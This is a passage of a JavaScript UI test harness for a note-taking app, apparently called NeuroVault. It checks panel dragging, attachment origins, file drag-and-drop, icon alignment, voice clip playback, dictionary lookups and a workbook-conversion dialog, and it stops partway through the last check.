    // 12 · QC 65: window-bar icons never move with the panels. Drag each divider 100px wider and narrower: every window-bar icon
    //     outside the tabs keeps its x (mid-drag and after the redraw), and the tabs never sit under the capture group
    { R.qc65 = {}; const keepQ = { side: PAR.side, insp: PAR.insp };
      for (const sc of ['1920x1080', '1366x768']) {
        set({ screen: sc, sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true, inspector: 'shown' }); PAR.side = null; PAR.insp = null; parWidths(); renderAll();
        const z = parZoom(), icons = () => [...app.querySelectorAll('.titlebar button')].filter(b => b.getClientRects().length && !b.closest('.tabstrip, .tab-tools'))
          .map(b => [b.dataset.act + (b.dataset.v ? ':' + b.dataset.v : ''), Math.round(b.getBoundingClientRect().left / z * 2) / 2]);
        const clear = () => { const c = app.querySelector('.titlebar .tb-caps > :last-child'), t = app.querySelector('.titlebar .tabstrip'); return !c || !t || t.getBoundingClientRect().left >= c.getBoundingClientRect().right + 4 * z - .5; };
        const x0 = icons(), steps = [];
        for (const k of ['side', 'insp']) for (const d of [100, -100]) {
          const h = app.querySelector(`[data-par-resize="${k}"]`), b = h.getBoundingClientRect(), w0 = parNow(k), dx = (k === 'side' ? d : -d) * z;
          const pt = (t, x) => h.dispatchEvent(new PointerEvent(t, { clientX: x, clientY: b.top + 50, button: 0, bubbles: true, cancelable: true, pointerId: 1 }));
          pt('pointerdown', b.left + 3); pt('pointermove', b.left + 3 + dx); const mid = icons(); pt('pointerup', b.left + 3 + dx); renderAll(); const after = icons(), w1 = parNow(k);
          const moved = x0.filter(([n, x], i) => mid[i]?.[1] !== x || after[i]?.[1] !== x).map(([n, x], i) => `${n} ${x}→${after[i]?.[1]}`);
          steps.push(`${k} ${d > 0 ? '+' : ''}${d}: ${w0}→${w1}${moved.length ? ' moved ' + moved.join(', ') : ''}${clear() ? '' : ' · tabs under the capture group'}`);
          if (Math.abs(w1 - clamp(w0 + d, PAR_MIN, PAR_MAX)) > 1 || moved.length || after.length !== x0.length || !clear()) bad('QC 65 window-bar icons stay put when a divider is dragged', `${sc}: ${steps.at(-1)}`);
          parSet(k, null, false); renderAll(); }
        R.qc65[sc] = `${x0.length} icons (${x0.map(x => x[0]).join(' ')}) · ${steps.join(' · ')}`; out.combos++; }
      PAR.side = keepQ.side; PAR.insp = keepQ.insp; parWidths(); renderAll(); }

    // 13 · QC 68: a copied file names where it came from first. The row says "From <folder>"; its details list the original,
    //      then the vault copy; Reveal goes to the original. The vault copy first when the setting says so; an original that
    //      has gone says so and Reveal falls back to the copy; a file NeuroVault made has only its vault copy; the setting row
    { R.qc68 = {}; const keepF = ATTF.first, pdf = SAMPLE_ATTS[4].file, png = SAMPLE_ATTS[0].file;   // png: a voice clip NeuroVault recorded (no original)
      const look = sc => { const row = app.querySelector(`#right-sidebar .att-row[data-v="${CSS.escape(pdf)}"]`), det = row?.parentElement.querySelector('.att-detail'), side = app.querySelector('#right-sidebar');
        const locs = [...(det?.querySelectorAll('.att-where .att-loc') || [])].map(l => l.querySelector('.att-loc-k').textContent + (l.classList.contains('is-gone') ? ' (gone)' : ''));
        const over = [...(det?.querySelectorAll('.att-where .att-loc') || [])].some(l => l.getBoundingClientRect().right > side.getBoundingClientRect().right + .5);
        ATTF.last = null; det?.querySelector('[data-act="att-reveal"]')?.click();
        return { sub: row?.querySelector('.list-item-sub')?.textContent || '', locs: locs.join(' → '), over, reveal: ATTF.last, title: det?.querySelector('[data-act="att-reveal"]')?.title || '' }; };
      for (const sc of ['1920x1080', '1366x768']) {
        ATTF.first = 'source'; set({ screen: sc, sample: 'typical', view: 'notes', modal: null, zen: 'off', inspector: 'shown' }); S.tab = 'files'; S.attOpen = pdf; renderAll();
        const a = look(sc); R.qc68[sc] = `source first: "${a.sub}" · ${a.locs} · Reveal → ${a.reveal}`;
        if (!/^From Downloads · /.test(a.sub) || a.locs !== 'Original → Vault copy' || a.reveal !== 'src' || !/original/.test(a.title) || a.over) bad('QC 68 the original comes first: the row, its details, Reveal', `${sc}: ${R.qc68[sc]} · overflow ${a.over}`);
        ATTF.first = 'vault'; renderAll(); const b = look(sc); R.qc68[sc] += ` · vault first: "${b.sub}" · ${b.locs} · Reveal → ${b.reveal}`;
        if (/^From/.test(b.sub) || b.locs !== 'Vault copy → Original' || b.reveal !== 'copy') bad('QC 68 Show first: The vault copy', `${sc}: ${R.qc68[sc]}`);
        ATTF.first = 'source'; const at = D.atts.find(x => x.file === pdf); at.source = { ...at.source, exists: false }; renderAll(); const c = look(sc);
        R.qc68[sc] += ` · original gone: "${c.sub}" · ${c.locs} · Reveal → ${c.reveal}`;
        if (!/moved or deleted/.test(c.sub) || c.locs !== 'Original (gone) → Vault copy' || c.reveal !== 'copy') bad('QC 68 an original that has gone says so; Reveal shows the copy', `${sc}: ${R.qc68[sc]}`);
        at.source = { ...at.source, exists: true };
        S.attOpen = png; renderAll(); const own = [...app.querySelectorAll('#right-sidebar .att-detail .att-where .att-loc-k')].map(k => k.textContent).join(' → ');
        if (own !== 'Vault copy') bad('QC 68 a file NeuroVault made has only its vault copy', `${sc}: ${own}`);
        D.attFrom = { [rawId(note().id)]: { path: 'C:\\Users\\you\\Downloads\\Trip notes.md', exists: true, how: 'open' } }; S.attOpen = null; renderAll();
        const op = app.querySelector('#right-sidebar .att-opened')?.textContent.replace(/\s+/g, ' ').trim(); R.qc68[sc] += ` · "${op}"`;
        if (op !== 'Opened from Trip notes.md in Downloads') bad('QC 68 a note opened from a file says where it is', `${sc}: ${op}`);
        D.attFrom = {}; out.combos++; }
      S.setSec = 'vault'; set({ screen: '1920x1080', modal: 'settings' }); const row = app.querySelector('.att-first-set');
      R.qc68.settings = row ? row.querySelector('.set-label').textContent + ': ' + [...row.querySelectorAll('.seg-opt')].map(b => b.textContent + (b.getAttribute('aria-pressed') === 'true' ? '*' : '')).join(' / ') : 'no row';
      ATTF.saved = []; row?.querySelector('[data-v="vault"]')?.click();
      if (R.qc68.settings !== 'Show first: Where it came from* / The vault copy' || ATTF.first !== 'vault' || ATTF.saved.join() !== 'vault') bad('QC 68 Settings → Vault & files → Show first', R.qc68.settings);
      ATTF.first = keepF; S.modal = null; S.tab = 'outline'; S.attOpen = null; renderAll(); out.combos++; }

    // 14 · QC 69: a file from Explorer is only ever copied. After a stale internal drag (a tree row, a note tab), a Files drag
    //      over a folder row or a tab ends with dropEffect "copy", clears the stale drag, and its drop moves no note; a plain
    //      mouse move clears a stale drag; an internal tree drag (no Files) is still a move
    { R.qc69 = {}; set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true }); D.folders.forEach(f => S.open.add(f.id)); renderAll();
      const rec = dt => { let v = 'none'; dt.sets = []; Object.defineProperty(dt, 'dropEffect', { configurable: true, get: () => v, set: x => { v = x; dt.sets.push(x); } }); return dt; };   // a made-up DataTransfer ignores dropEffect: record what each handler sets
      const fileDT = () => { const dt = new DataTransfer(); dt.items.add(new File(['CV'], 'CV 1.1.docx', { type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' })); return rec(dt); };
      const fire = (el, type, dt) => { const r = el.getBoundingClientRect(), ev = new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: dt, clientX: r.left + 10, clientY: r.top + r.height / 2 }); el.dispatchEvent(ev); return ev; };
      const folder = app.querySelector('[data-tree="folder"]'), fid = folder?.dataset.v, n = D.notes.find(x => x.folder !== fid), f0 = n?.folder;
      // the stale tree drag
      S.drag = { kind: 'note', id: n.id }; let dt = fileDT(); fire(folder, 'dragenter', dt); const ov = fire(folder, 'dragover', dt);
      R.qc69.tree = `dropEffect ${dt.dropEffect} (set ${dt.sets.join(' → ')}) · stale drag ${!!S.drag} · drop line ${!!app.querySelector('.is-drop[data-tree]')}`;
      if (dt.dropEffect !== 'copy' || S.drag || app.querySelector('.is-drop[data-tree]')) bad('QC 69 a file over a folder row after a stale tree drag is copied, never moved', R.qc69.tree);
      S.drag = { kind: 'note', id: n.id }; dt = fileDT(); fire(folder, 'drop', dt); await new Promise(r => setTimeout(r, 60));
      R.qc69.tree += ` · after the drop: the note's folder ${n.folder === f0 ? 'unchanged' : 'CHANGED'}`; if (n.folder !== f0 || S.drag) bad('QC 69 a file dropped on a folder row moves no note', R.qc69.tree);
      DROPO.ask = null; S.modal = null; doEnd(); renderAll();
      // the stale note-tab drag
      const tab = app.querySelector('[data-wstab]'); S.tabDrag = tab?.dataset.wstab; dt = fileDT(); fire(app.querySelector('[data-wstab]'), 'dragover', dt);
      R.qc69.tab = `dropEffect ${dt.dropEffect} (set ${dt.sets.join(' → ')}) · stale tab drag ${!!S.tabDrag}`; if (dt.dropEffect !== 'copy' || S.tabDrag) bad('QC 69 a file over a tab after a stale tab drag is copied', R.qc69.tab);
      doEnd();
      // a plain mouse move ends a stale drag; a real tree drag (no Files) is still a move
      S.drag = { kind: 'note', id: n.id }; document.dispatchEvent(new MouseEvent('mousemove', { bubbles: true, buttons: 0 })); const cleared = !S.drag;
      const row = app.querySelector(`[data-tree="note"][data-v="${n.id}"]`); const idt = rec(new DataTransfer()); fire(row, 'dragstart', idt); const iov = fire(app.querySelector('[data-tree="folder"]'), 'dragover', idt);
      R.qc69.internal = `mouse move clears ${cleared} · tree drag: dropEffect ${idt.dropEffect} (types ${[...idt.types].join(',')})`; fire(row, 'dragend', idt); S.drag = null; clearDrop();
      if (!cleared || !iov.defaultPrevented || idt.dropEffect !== 'move') bad('QC 69 a plain mouse move ends a stale drag; a tree drag is still a move', R.qc69.internal);
      renderAll(); out.combos++; }

    // 15 · QC 73: things side by side line up. Dark mode ↔ Brain Dump and Settings ↔ Sticky Notes share a centre (0.5px); the
    //      rows' icons are the rail's (the same svg and box); the rail's foot sits as far from the window's bottom as from its
    //      sides; the status bar's first › (older steps hidden, as on a narrow note) is centred under the back arrow ‹ (0.5px).
    //      At 1366, 1920 and 2560, and with the left sidebar at 200 and 480px
    { R.qc73 = {}; SCREENS['2560x1305'] = [2560, 1305]; const keepTrail = S.trail, keepSide = PAR.side;
      const B = el => { const r = el.getBoundingClientRect(), k = parZoom(); return { l: r.left / k, t: r.top / k, w: r.width / k, h: r.height / k, cx: (r.left + r.width / 2) / k, cy: (r.top + r.height / 2) / k, b: r.bottom / k }; };
      for (const [sc, side] of [['1366x768', null], ['1920x1080', null], ['2560x1305', null], ['1920x1080', 200], ['1920x1080', 480]]) {
        set({ screen: sc, sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true }); PAR.side = side; parWidths();
        S.trail = [{ kind: 'view', ref: 'tasks', label: 'Tasks', icon: 'check' }, { kind: 'note', ref: note().id, label: note().title, icon: 'file' }]; renderAll();
        const tag = `${sc}${side ? ' side ' + side : ''}`, foot = [...app.querySelectorAll('.rail-foot > *')], rows = ['inbox', 'stickies'].map(k => app.querySelector(`.tree-sys [data-tree="${k}"]`));
        const pairs = foot.map((f, i) => [B(f), rows[i] && B(rows[i])]), dy = pairs.map(([f, r]) => r ? +(r.cy - f.cy).toFixed(2) : NaN);
        const fi = foot.map(f => B(f.querySelector('svg'))), ri = rows.map(r => r && B(r.querySelector('.tree-file svg'))), rb = rows.map(r => r && B(r.querySelector('.tree-file')));
        const icons = fi.every((f, i) => ri[i] && Math.abs(f.w - ri[i].w) < .5 && Math.abs(f.h - ri[i].h) < .5) && pairs.every(([f], i) => rb[i] && Math.abs(f.w - rb[i].w) < .5 && Math.abs(f.h - rb[i].h) < .5);
        const rail = B(app.querySelector('.rail')), inset = +(rail.b - pairs[pairs.length - 1][0].b).toFixed(2), sideIn = +(pairs[0][0].l - rail.l).toFixed(2);
        const steps = [...app.querySelectorAll('.status-bar .trail-step')]; steps.slice(0, -1).forEach(x => { x.style.display = 'none'; }); app.querySelector('.status-bar .trail-label')?.style.setProperty('display', 'none');
        const sep = app.querySelector('.status-bar .trail-step:last-child .trail-sep svg'), back = app.querySelector('.view--note .app-header [data-act="back"] svg, .main .app-header [data-act="back"] svg');
        const dx = sep && back ? +(B(sep).cx - B(back).cx).toFixed(2) : NaN;
        R.qc73[tag] = `centres Δ ${dy.join(' / ')} · icons ${fi.map(f => f.w).join('/')} vs ${ri.map(r => r?.w).join('/')} (boxes ${pairs.map(([f]) => f.w).join('/')} vs ${rb.map(r => r?.w).join('/')}) · foot ${inset}px from the bottom, ${sideIn}px from the side · › vs ‹ Δx ${dx}`;
        if (dy.some(d => !(Math.abs(d) <= .5))) bad('QC 73 dark mode ↔ Brain Dump and Settings ↔ Sticky Notes share a centre', `${tag}: ${R.qc73[tag]}`);
        if (!icons) bad('QC 73 the Brain Dump and Sticky Notes icons are the rail icons’ size', `${tag}: ${R.qc73[tag]}`);
        if (Math.abs(inset - sideIn) > .5 || inset < 7.5) bad('QC 73 the rail’s foot sits up off the window’s bottom, as far as from its sides', `${tag}: ${R.qc73[tag]}`);
        if (!(Math.abs(dx) <= .5)) bad('QC 73 the status bar’s › lines up with the back arrow ‹', `${tag}: ${R.qc73[tag]}`);
        out.combos++; }
      S.trail = keepTrail; PAR.side = keepSide; parWidths(); delete SCREENS['2560x1305']; set({ screen: '1920x1080' }); renderAll(); }

    // 16 · QC 75: a voice thought plays wherever it's listed. In the Brain Dump page every row from a recording, done or not,
    //      has the clip player (play, position, speed; no file link, Transcribe or its own ⋯: the row has ⋮); one clip plays at a
    //      time; play leaves the tick alone; the tick and ⋮ still work; a recording that has gone shows as a clip does; a typed
    //      thought has none; nothing runs past the row. Silent: with no app, play only moves the clock (and the check never starts it)
    { R.qc75 = {}; const keepInbox = D.inbox, keepList = LD.list;
      for (const sc of ['1366x768', '1920x1080']) {
        set({ screen: sc, sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true });
        D.inbox = [{ id: 'in-c1', t: '20:17', day: todayKey(), text: 'Testing the audio in Brain Dump, a long enough line to wrap in the row.', audio: SAMPLE_ATTS[0].file, tasks: [], taskIds: ['t-x'] },
          { id: 'in-c2', t: '20:22', day: todayKey(), text: '', audio: SAMPLE_ATTS[2].file, tasks: [], taskIds: [] },
          { id: 'in-c3', t: '20:30', day: todayKey(), text: 'Gone', audio: 'attachments/voice-gone.ogg', tasks: [], taskIds: [] },
          { id: 'in-c4', t: '12:53', day: todayKey(), text: 'A typed thought', tasks: [], taskIds: [] }];
        Object.keys(S.clips).forEach(k => delete S.clips[k]); LD.list = 'inbox'; renderAll();
        const row = id => app.querySelector(`.ld-item[data-ld-item="in:${id}"]`), has = (r, q) => !!r?.querySelector(q);
        const look = r => ({ play: has(r, '.ld-clip [data-act="clip-play"]'), seek: has(r, '.ld-clip [data-act="clip-seek"]'), speed: has(r, '.ld-clip [data-act="clip-speed"]'), extra: has(r, '.ld-clip .clip-file:not(.clip-gone), .ld-clip [data-act="clip-transcribe"], .ld-clip [data-act="att-menu"]'), tick: has(r, '.ld-check'), more: has(r, '.ld-more') });
        const a = look(row('in-c1')), b = look(row('in-c2')), gone = row('in-c3'), typed = row('in-c4');
        const box = row('in-c1').getBoundingClientRect(), clipBox = row('in-c1').querySelector('.ld-clip .clip').getBoundingClientRect();
        R.qc75[sc] = `voice ${JSON.stringify(a)} · no text ${b.play && b.speed} · gone "${gone?.querySelector('.clip-gone')?.textContent}" find ${has(gone, '[data-act="att-find"]')} · typed clip ${has(typed, '.ld-clip')} · clip inside the row ${clipBox.right <= box.right + .5}`;
        if (!a.play || !a.seek || !a.speed || a.extra || !a.tick || !a.more || !b.play || !b.speed || !has(gone, '.clip-gone') || !has(gone, '[data-act="att-find"]') || has(typed, '.ld-clip') || clipBox.right > box.right + .5)
          bad('QC 75 a Brain Dump row from a recording has the clip player', `${sc}: ${R.qc75[sc]}`);
        // play: one at a time, and the tick stays as it was
        const tick0 = row('in-c1').querySelector('.ld-check').checked;
        row('in-c1').querySelector('[data-act="clip-play"]').click(); await new Promise(r => setTimeout(r, 30)); const p1 = !!S.clips[SAMPLE_ATTS[0].file]?.playing;
        row('in-c2').querySelector('[data-act="clip-play"]').click(); await new Promise(r => setTimeout(r, 30)); const p2 = !!S.clips[SAMPLE_ATTS[2].file]?.playing, p1off = !S.clips[SAMPLE_ATTS[0].file]?.playing;
        const pressed = row('in-c2')?.querySelector('[data-act="clip-play"]')?.getAttribute('aria-pressed'), tick1 = row('in-c1').querySelector('.ld-check').checked;
        stopPlayer(); R.qc75[sc] += ` · play ${p1} then the other ${p2}, the first stops ${p1off}, pressed ${pressed} · tick unchanged ${tick0 === tick1}`;
        if (!p1 || !p2 || !p1off || pressed !== 'true' || tick0 !== tick1) bad('QC 75 the row’s clip plays (one at a time) and leaves the tick alone', `${sc}: ${R.qc75[sc]}`);
        // ⋮ still opens its menu; a done thought keeps its player
        row('in-c1').querySelector('.ld-more').click(); await new Promise(r => setTimeout(r, 30)); const menu = LD.menu; LD.menu = null; renderAll();
        const done = ldThoughtRow({ id: 'in-c5', t: '09:00', day: todayKey(), text: 'Done one', audio: SAMPLE_ATTS[0].file, done: true, tasks: [], taskIds: [] });
        R.qc75[sc] += ` · ⋮ ${menu} · done row player ${/data-act="clip-play"/.test(done)}`;
        if (menu !== 'in:in-c1' || !/data-act="clip-play"/.test(done)) bad('QC 75 ⋮ still works; a done thought keeps its player', `${sc}: ${R.qc75[sc]}`);
        out.combos++; }
      D.inbox = keepInbox; LD.list = keepList; Object.keys(S.clips).forEach(k => delete S.clips[k]); renderAll(); }

    // 17 · R56: the dictionary. Setup → Reading: one card, nothing picked, with its size, source and licence; Download it joins
    //      the downloads and the Ready step; Not now leaves it out; already here: no choice. Settings → Editor → Dictionary: the
    //      offline card (Download, or On this PC and Remove with a confirm) and the online card (off; what's sent; three services
    //      with who / keeps / links). Lookups: offline first; "Look it up online" asks the first time (nothing to tick); the answer
    //      is tagged Online and credited; offline says so; "did you mean"; the word popover too. No network: a stand-in answers
    { R.r56 = {}; const keepD = { mode: DJO.mode, seen: DJO.seen, demo: DJO.demo }, keepSave56 = saveSettings; saveSettings = () => {};
      const txt = el => (el?.textContent || '').replace(/\s+/g, ' ').trim();
      try {
        // the setup's card
        for (const sc of ['1366x768', 'portrait1080']) {
          djDemo('none'); set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); aiDemo('none'); SETUP.info = null; SETUP.open = false; openSetup(false); SETUP.reached = 5; delete S.ob.dict; obGo('comfort');
          const card = app.querySelector('#ob-dict'), t = txt(card), opts = [...(card?.querySelectorAll('[data-act="ob-dict"]') || [])];
          const fits = card && card.getBoundingClientRect().right <= app.querySelector('.onboard-card').getBoundingClientRect().right + .5
            && [...card.querySelectorAll('svg')].every(g => g.getBoundingClientRect().width <= 18.5) && opts.every(b => [...b.children].every(c => c.getBoundingClientRect().bottom <= b.getBoundingClientRect().bottom + .5));   // no icon drawn huge or spilling out of its button
          const facts = /11\.4 MB download, about 34 MB on this PC/.test(t) && /Open English WordNet 2025/.test(t) && /CC BY 4\.0/.test(t) && /en-word\.net/.test(t);
          const none = opts.length === 2 && opts.every(b => b.getAttribute('aria-pressed') === 'false') && opts.map(txt).join(' / ') === 'Download it / Not now';
          const before = obDownloads().some(x => x.key === 'dict');
          opts[0]?.click(); const yes = obDownloads().find(x => x.key === 'dict'); obGo('done'); const ready = txt(app.querySelector('.ob-files'));
          obGo('comfort'); app.querySelector('[data-act="ob-dict"][data-v="no"]')?.click(); const no = obDownloads().some(x => x.key === 'dict');
          R.r56['setup ' + sc] = `facts ${facts} · nothing picked ${none} · fits ${fits} · Download it → ${yes ? yes.label + ' ' + Math.round(yes.bytes / 1e5) / 10 + ' MB' : 'no'} · Ready lists it ${/Open English WordNet 2025 \(dictionary\)/.test(ready)} · Not now → in the list ${no}`;
          if (!facts || !none || !fits || before || !yes || yes.bytes !== 11363503 || !/Open English WordNet 2025 \(dictionary\)/.test(ready) || no) bad('R56 the setup offers the offline dictionary in the Reading step', `${sc}: ${R.r56['setup ' + sc]}`);
          closeSetup(); out.combos++; }
        djDemo('ready'); SETUP.open = false; openSetup(false); SETUP.reached = 5; obGo('comfort'); const have = txt(app.querySelector('#ob-dict'));
        if (!/Already on this PC/.test(have) || app.querySelector('#ob-dict [data-act="ob-dict"]')) bad('R56 the setup card says the dictionary is already here', have);
        closeSetup(); delete S.ob.dict;
        // Settings → Editor → Dictionary
        for (const st of ['none', 'ready']) {
          djDemo(st); DJO.mode = 'ask'; S.setSec = 'editor'; set({ screen: '1920x1080', modal: 'settings' });
          const off = app.querySelector('#djo-offline'), on = app.querySelector('#djo-online'), tog = on?.querySelector('[data-act="djo-mode"]');
          const svcs = [...(on?.querySelectorAll('.djo-svc') || [])].map(x => [x.querySelector('.set-label').textContent, x.querySelectorAll('[data-act="nv-link"]').length, /Run by|run by/.test(txt(x)), /keep|privacy/i.test(txt(x))]);
          const offT = txt(off), act = st === 'ready' ? off?.querySelector('[data-act="djo-remove"]') : off?.querySelector('[data-act="dict-download"]');
          R.r56['settings ' + st] = `offline: ${st === 'ready' ? 'On this PC ' + /On this PC/.test(offT) : 'Download ' + !!act} · facts ${/34 MB/.test(offT) && /CC BY 4\.0/.test(offT)} · toggle ${tog?.getAttribute('aria-checked')} · sent "${txt(on?.querySelector('.djo-sent .set-desc'))}" · ${svcs.map(x => x.join(':')).join(' | ')}`;
          if (!off || !act || !/CC BY 4\.0/.test(offT) || tog?.getAttribute('aria-checked') !== 'false' || !/Only the word you look up/.test(txt(on)) || !/Never the sentence or the note/.test(txt(on))
            || svcs.map(x => x[0]).join(',') !== 'Free Dictionary API,Wiktionary,Datamuse' || svcs.some(x => !x[1] || !x[2] || !x[3])) bad('R56 Settings → Editor → Dictionary: the offline and online cards', R.r56['settings ' + st]);
          if (st === 'ready') { act.click(); const conf = !!app.querySelector('.djo-confirm'); app.querySelector('[data-act="djo-remove-yes"]')?.click(); await new Promise(r => setTimeout(r, 30));
            R.r56.remove = `confirm ${conf} · then ${DJ.st?.state} · Download offered ${!!app.querySelector('#djo-offline [data-act="dict-download"]')}`;
            if (!conf || DJ.st?.state !== 'none' || !app.querySelector('#djo-offline [data-act="dict-download"]')) bad('R56 Remove asks, then the offline dictionary goes', R.r56.remove); }
          DJO.saved = []; app.querySelector('#djo-online [data-act="djo-mode"]').click(); const saved = JSON.stringify(DJO.saved);   // re-found: Remove redrew the page R.r56['settings ' + st] += ` · toggled ${DJO.mode} ${saved}`;
          if (DJO.mode !== 'always' || saved !== '[{"dict_online":"always"}]') bad('R56 the online toggle saves dict_online', R.r56['settings ' + st]);
          app.querySelector('#djo-online [data-act="nv-link"]')?.click(); if (!/^https:\/\//.test(DJO.opened || '')) bad('R56 the services’ links open', String(DJO.opened));
          S.modal = null; out.combos++; }
        // lookups: offline first; ask the first time; the online answer and its credit; offline; did you mean; the popover
        const look = async (q, mode, seen, demo) => { djDemo('ready'); Object.assign(DJO, { mode, seen, demo, res: {}, notice: null, busy: null }); DJ.q = q; set({ screen: '1366x768', view: 'dict', modal: null }); await djSearchNow(); renderAll(); return app.querySelector('#main-view-dict'); };
        let v = await look('consolidate', 'always', true, 'found'); const offlineFirst = !v.querySelector('.djo-sec, .djo-entry') && !!v.querySelector('.dict-entry');
        v = await look('qwzzle', 'ask', false, 'found'); const askBtn = !!v.querySelector('[data-act="djo-look"]'), sentTo = /dictionaryapi\.dev/.test(txt(v.querySelector('[data-djo="ask"]')));
        v.querySelector('[data-act="djo-look"]').click(); const notice = app.querySelector('[data-djo="notice"]'), noTick = notice && !notice.querySelector('input[type="checkbox"]'), noticeT = txt(notice);
        app.querySelector('[data-act="djo-yes"]').click(); for (let i = 0; i < 20 && !app.querySelector('[data-djo="found"]'); i++) await new Promise(r => setTimeout(r, 20));
        const found = app.querySelector('#main-view-dict [data-djo="found"]'), credit = txt(found?.querySelector('.djo-credit'));
        R.r56.lookup = `offline first ${offlineFirst} · ask ${askBtn} (to dictionaryapi.dev ${sentTo}) · notice "${noticeT.slice(0, 60)}…" no tick ${noTick} · seen ${DJO.seen} · tag "${txt(found?.querySelector('.djo-tag'))}" · credit "${credit}"`;
        if (!offlineFirst || !askBtn || !sentTo || !notice || !noTick || !/Only the word you look up/.test(noticeT) || !DJO.seen || txt(found?.querySelector('.djo-tag')) !== 'Online'
          || !/^From Wiktionary, via the Free Dictionary API · Wiktionary’s page · CC BY-SA 3\.0 · the word went to api\.dictionaryapi\.dev$/.test(credit)) bad('R56 a word only found online: asked first, tagged and credited', R.r56.lookup);
        v = await look('qwzzle', 'ask', true, 'found'); v.querySelector('[data-act="djo-look"]').click(); for (let i = 0; i < 20 && !app.querySelector('[data-djo="found"]'); i++) await new Promise(r => setTimeout(r, 20));
        const second = !!app.querySelector('[data-djo="found"]') && !app.querySelector('[data-djo="notice"]');
        v = await look('qwzzle', 'always', true, 'offline'); for (let i = 0; i < 20 && !app.querySelector('[data-djo="offline"]'); i++) await new Promise(r => setTimeout(r, 20)); const offMsg = txt(app.querySelector('[data-djo="offline"]'));
        v = await look('qwzzle', 'always', true, 'none'); for (let i = 0; i < 20 && !app.querySelector('[data-djo="none"]'); i++) await new Promise(r => setTimeout(r, 20)); const dym = [...app.querySelectorAll('[data-djo="none"] [data-act="dict-go"]')].map(txt).join(',');
        v = await look('qwzzle', 'off', true, 'found'); const offMode = !v.querySelector('.djo-sec, [data-act="djo-look"]');
        R.r56.lookup2 = `asked again: no notice ${second} · offline "${offMsg}" · did you mean ${dym} · off: nothing ${offMode}`;
        if (!second || offMsg !== 'You’re offline, so only the offline dictionary and your words were searched.' || dym !== 'amble,ample' || !offMode) bad('R56 later lookups, offline, did you mean, and off', R.r56.lookup2);
        // the word popover: nothing offline, so it offers the online lookup too
        Object.assign(DJO, { mode: 'ask', seen: true, demo: 'found', res: {}, notice: null }); set({ view: 'notes', modal: null });
        S.modal = 'word'; S.word = { word: 'qwzzle', nth: 0, at: { x: 400, y: 300 }, res: { shown: null, guessed: false, close: [], prefix: [] } }; renderAll();
        const pop = app.querySelector('[data-wordpop]'); pop?.querySelector('[data-act="djo-look"]')?.click(); for (let i = 0; i < 20 && !app.querySelector('[data-wordpop] [data-djo="found"]'); i++) await new Promise(r => setTimeout(r, 20));
        R.r56.popover = `offer ${!!pop?.querySelector('[data-act="djo-look"]')} · answer ${!!app.querySelector('[data-wordpop] [data-djo="found"]')} · credit ${!!app.querySelector('[data-wordpop] .djo-credit')}`;
        if (!app.querySelector('[data-wordpop] [data-djo="found"] .djo-credit')) bad('R56 the word popover looks it up online too, credited', R.r56.popover);
        S.modal = null; S.word = null; out.combos++;
      } finally { Object.assign(DJO, keepD, { res: {}, notice: null, busy: null }); saveSettings = keepSave56; djDemo('ready'); SETUP.open = false; S.modal = null; DJ.q = ''; set({ screen: '1920x1080', view: 'notes' }); renderAll(); } }

    // 18 · R57: a workbook asks in the one dialog. A dropped or opened .xlsx: the three choice rows; Convert lists its sheets (the
    //      hidden one unticked, "Hidden in Excel"; a big one "the first 500 rows go in the note"; merged cells "a rich table");
    //      the main button says Convert N sheets and waits for one; the picked sheets go to convert_file; Attach has no sheets;
    //      the drag overlay calls it a workbook; Open file brings it to the same dialog. Convert is a stand-in: nothing runs
    { R.r57 = {}; const keepConv = doConvert, got = []; doConvert = async (path, name, mode, fid, o = {}) => { got.push([name, o.sheets]); return null; };
      const txt = el => (el?.textContent || '').replace(/\s+/g, ' ').trim();
      const ask = (sc, noteId) => { set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); DROPO.dialog = 'rows';
        DROPO.ask = { files: [{ name: 'Budget 2026.xlsx', size: 64000, kind: 'xlsx', path: 'C:/Users/you/Downloads/Budget 2026.xlsx' }], noteId: noteId === undefined ? note().id : noteId, at: 0 }; S.modal = 'do-ask'; renderAll(); return app.querySelector('.do-ask'); };
      try {
        for (const sc of ['1366x768', 'portrait1080']) {
          let m = ask(sc); m.querySelector('[data-act="dq-pick"][data-v="convert"]').click(); await new Promise(r => setTimeout(r, 20)); m = app.querySelector('.do-ask');
          const rows = [...m.querySelectorAll('.dq-choice b')].map(txt), sheets = [...m.querySelectorAll('.dq-sheet')], meta = txt(m.querySelector('.dq-file-meta'));
          const ticks = sheets.map(l => `${txt(l.querySelector('b'))}:${l.querySelector('input').checked ? 'on' : 'off'}${l.querySelector('.chip') ? ' (hidden)' : ''}`).join(', ');
          const big = /first 500 rows go in the note/.test(txt(sheets[1])), rich = /rich table/.test(txt(sheets[0])), btn = m.querySelector('[data-act="dq-add"]');
          const md = m.getBoundingClientRect(), fits = sheets.every(l => l.getBoundingClientRect().right <= md.right + .5) && md.bottom <= app.getBoundingClientRect().bottom + .5;   // inside the app's frame (the screen being checked)
          R.r57[sc] = `"${meta}" · ${rows.join(' / ')} · sheets ${ticks} · big ${big} rich ${rich} · "${txt(btn)}" · fits ${fits}`;
          if (meta !== 'Excel workbook · 3 sheets, 1 hidden · 64 KB' || rows.join('|') !== 'Attach to this note|Convert into a new note|Attach to a new note' || ticks !== 'Summary:on, Q3 detail:on, Lookups:off (hidden)' || !big || !rich || txt(btn) !== 'Convert 2 sheets' || btn.disabled || !fits)
            bad('R57 a workbook asks in the choice rows, its sheets under Convert', `${sc}: ${R.r57[sc]}`);
          // none ticked: the button waits; one: "Convert 1 sheet", and that sheet goes to convert_file
          ['0', '1'].forEach(i => { const b = app.querySelector(`[data-dq-sheet="${i}"]`); b.checked = false; b.dispatchEvent(new Event('change', { bubbles: true })); });
          const none = app.querySelector('.do-ask [data-act="dq-add"]'), noneState = `${txt(none)} disabled ${none.disabled}`;
          const hid = app.querySelector('[data-dq-sheet="2"]'); hid.checked = true; hid.dispatchEvent(new Event('change', { bubbles: true }));
          const one = txt(app.querySelector('.do-ask [data-act="dq-add"]')); got.length = 0; app.querySelector('.do-ask [data-act="dq-add"]').click(); await new Promise(r => setTimeout(r, 30));
          R.r57[sc] += ` · none: ${noneState} · then "${one}" → ${JSON.stringify(got)}`;
